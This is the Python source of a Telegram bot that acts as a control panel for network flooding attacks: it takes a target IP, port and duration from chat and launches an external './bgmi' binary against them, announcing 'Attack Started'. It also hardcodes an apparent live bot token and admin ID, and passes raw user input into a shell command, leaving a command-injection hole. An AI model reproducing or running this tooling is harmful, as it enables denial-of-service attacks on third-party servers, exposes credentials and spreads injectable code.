import telebot
import subprocess
import threading
import time
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# Insert your Telegram bot token here
bot = telebot.TeleBot('7275541136:AAE2auUbnW-5OKmzcD5cbIuUX5rTUpsW7Gk')

# Admin user IDs
admin_id = ["6022173368"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# Temporary storage for user inputs and status
user_inputs = {}
current_status = {"running": False, "start_time": None, "target": None, "port": None, "time": None}

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else f"UserID: {user_id}"
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Runtime status checker
def runtime_checker():
    while True:
        if current_status["running"]:
            elapsed = time.time() - current_status["start_time"]
            if elapsed >= int(current_status["time"]):  # If time exceeds, mark as stopped
                current_status["running"] = False
                current_status["target"] = None
                current_status["port"] = None
                current_status["time"] = None
                bot.send_message(
                    admin_id[0], "Attack Stopped: Time Limit Exceeded or Process Interrupted"
                )
        time.sleep(5)  # Check every 5 seconds

# Start runtime checker in a separate thread
threading.Thread(target=runtime_checker, daemon=True).start()

@bot.message_handler(commands=['start'])
def send_welcome(message):
    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton("View Command", callback_data="view_command"))  # Only View Command is shown initially
    bot.reply_to(message, "Welcome! Press the button below to view commands:", reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: True)
def handle_callback_query(call):
    user_id = str(call.message.chat.id)

    if call.data == "view_command":
        # Show other command buttons dynamically
        keyboard = InlineKeyboardMarkup()
        keyboard.add(InlineKeyboardButton("IP", callback_data="get_ip"))
        keyboard.add(InlineKeyboardButton("Check", callback_data="check_status"))
        keyboard.add(InlineKeyboardButton("Verify", callback_data="verify"))
        keyboard.add(InlineKeyboardButton("Add User", callback_data="add_user"))
        keyboard.add(InlineKeyboardButton("Remove User", callback_data="remove_user"))

        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="Commands are now visible:",
            reply_markup=keyboard,
        )

    elif call.data == "get_ip":
        bot.send_message(call.message.chat.id, "*Target IP:*", parse_mode="Markdown")
        user_inputs[user_id] = {"step": "target"}

    elif call.data == "check_status":
        if current_status["running"]:
            elapsed = time.time() - current_status["start_time"]
            status_message = (
                f"Bot is running!\n"
                f"Target: {current_status['target']}\n"
                f"Port: {current_status['port']}\n"
                f"Time remaining: {int(current_status['time']) - int(elapsed)} seconds\n"
            )
        else:
            status_message = "Bot is Stopped."
        bot.send_message(call.message.chat.id, status_message)

    elif call.data == "add_user":
        if user_id in admin_id:
            bot.send_message(call.message.chat.id, f"*{user_id}*", parse_mode="Markdown")
            user_inputs[user_id] = {"step": "add_user"}

    elif call.data == "remove_user":
        if user_id in admin_id:
            bot.send_message(call.message.chat.id, f"*{user_id}*", parse_mode="Markdown")
            bot.send_message(call.message.chat.id, "*Send the User ID to remove:*", parse_mode="Markdown")
            user_inputs[user_id] = {"step": "remove_user"}

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    user_id = str(message.chat.id)

    if user_id in user_inputs:
        step = user_inputs[user_id].get("step")

        if step == "target":
            user_inputs[user_id]["target"] = message.text
            user_inputs[user_id]["step"] = "port"
            bot.send_message(message.chat.id, "*Port:*", parse_mode="Markdown")

        elif step == "port":
            user_inputs[user_id]["port"] = message.text
            user_inputs[user_id]["step"] = "time"
            bot.send_message(message.chat.id, "*Time:*", parse_mode="Markdown")

        elif step == "time":
            user_inputs[user_id]["time"] = message.text
            user_inputs[user_id]["step"] = "confirm"

            target = user_inputs[user_id]["target"]
            port = user_inputs[user_id]["port"]
            time = user_inputs[user_id]["time"]

            log_command(user_id, target, port, time)

            current_status["running"] = True
            current_status["start_time"] = time.time()
            current_status["target"] = target
            current_status["port"] = port
            current_status["time"] = time

            response = f"Attack Started.\nTarget: {target}\nPort: {port}\nTime: {time} Seconds"
            full_command = f"./bgmi {target} {port} {time} 210"

            try:
                process = subprocess.Popen(full_command, shell=True)
                bot.send_message(message.chat.id, response)

                process.wait()
                if process.returncode != 0:
                    current_status["running"] = False
                    bot.send_message(message.chat.id, "Attack Stopped: Error in Process Execution")
            except Exception as e:
                current_status["running"] = False
                bot.send_message(message.chat.id, f"Attack Stopped: {str(e)}")

bot.polling()
